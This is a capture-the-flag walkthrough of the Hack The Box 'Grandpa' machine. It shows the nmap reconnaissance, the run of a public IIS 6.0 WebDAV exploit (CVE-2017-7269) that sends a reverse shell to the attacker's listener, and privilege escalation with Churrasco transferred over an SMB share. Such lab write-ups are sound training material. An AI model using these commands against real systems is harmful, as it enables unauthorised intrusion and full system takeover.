# Box: Grandpa
# Level: Easy
# OS: Windows
<hr>
Lets get started

# Recon

## Portscanning

command:```nmap -A -v -T4 -p- 10.129.95.233```

```
Nmap scan report for 10.129.95.233
Host is up (0.22s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Mon, 13 Feb 2023 16:46:19 GMT
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-ntlm-info: 
|   Target_Name: GRANPA
|   NetBIOS_Domain_Name: GRANPA
|   NetBIOS_Computer_Name: GRANPA
|   DNS_Domain_Name: granpa
|   DNS_Computer_Name: granpa
|_  Product_Version: 5.2.3790
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows 2000 SP4 (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   244.91 ms 10.10.14.43
2   245.07 ms 10.129.95.233

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 13 17:46:24 2023 -- 1 IP address (1 host up) scanned in 250.56 seconds
```
From our scan we can see we have just 1 open port, this means our enumeration today will be focused on port 80.



# Enumeration

Navigate to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/eb7731fd-6a41-48cb-986b-b26f248f919e)

Well, there was nothing interesting in the page source actually.

Going back to the nmap scan, I found this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6ccc2038-57f4-4ae5-ad11-4d48d571a03b)

Alright, so I think there's an exploit for that guy I highlighted

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9dd310ad-45ad-4604-9992-4f5561b5a543)

I was right hehehe. Well since we found our attack vector, lets exploit😎



# Exploitation

During the search for exploits I found [this](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269)

You can just clone it, so you'll be able to use  it

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Grandpa]
└─$ git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269.git
Cloning into 'iis6-exploit-2017-CVE-2017-7269'...
remote: Enumerating objects: 6, done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 6
Receiving objects: 100% (6/6), done.
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Grandpa]
└─$ cd iis6-exploit-2017-CVE-2017-7269 
                                                                                                                                                                                                
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Grandpa/iis6-exploit-2017-CVE-2017-7269]
└─$ ls -la         
total 32
drwxr-xr-x 3 bl4ck4non bl4ck4non  4096 Sep 20 17:15  .
drwxr-xr-x 3 bl4ck4non bl4ck4non  4096 Sep 20 17:15  ..
drwxr-xr-x 8 bl4ck4non bl4ck4non  4096 Sep 20 17:15  .git
-rw-r--r-- 1 bl4ck4non bl4ck4non 12313 Sep 20 17:15 'iis6 reverse shell'
-rw-r--r-- 1 bl4ck4non bl4ck4non    66 Sep 20 17:15  README.md
```
Lets try to run the exploit

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/HTB/Grandpa/iis6-exploit-2017-CVE-2017-7269]
└─$ python2 iis6\ reverse\ shell             
usage:iis6webdav.py targetip targetport reverseip reverseport
```
So, we have to specify the targetip and targetport, also our tun0 ip address and the port we plan on listening on

First, lets setup our netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c8d39bf3-5ab5-4ca3-ab3a-6e11d401c3af)

Now, lets run the exploit script

command:```python2 iis6\ reverse\ shell 10.129.74.174 80 10.10.14.122 1234```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fa7a90cc-f39f-48ac-9f2d-29d7ea98a203)

Checking our netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0cb72701-5ce3-4176-a704-f6bcdfab17a6)

We got a shell as ```nt authority\network service```, this means we  have to escalate our privileges



# Privilege Escalation

Running the command ```whoami /priv```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/73f7870f-1161-4e00-9a75-319a23287d8e)

As we can see ```SeImpersonatePrivilege``` is enabaled, so this may be vulnerable to a potato exploit.

We can try [churrasco](https://github.com/Re4son/Churrasco/blob/master/churrasco.exe) here

We'll  be transferring that to the target machine, now ```certutil``` and ```curl``` doesn't work on the target machine. This means we'll be sending the file over to the target using smb

Run this command in the directory where you downloaded the file

command:```smbserver.py share .```


Now, on the target machine run this

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7932bd9a-1053-4464-b53e-13756a6c5110)

We have successfully transferred the file. To run the executable

command:```c.exe -d "cmd.exe"```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/27576008-7737-4681-a3da-8a57e4e73d44)

We have successfully escalated our privileges.

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4df58a11-c739-4d5a-8068-6527acf5d844)

We have successfully pwned this box😎





That will be all for today
<br> <br>
[Back To Home](../../index.md)
















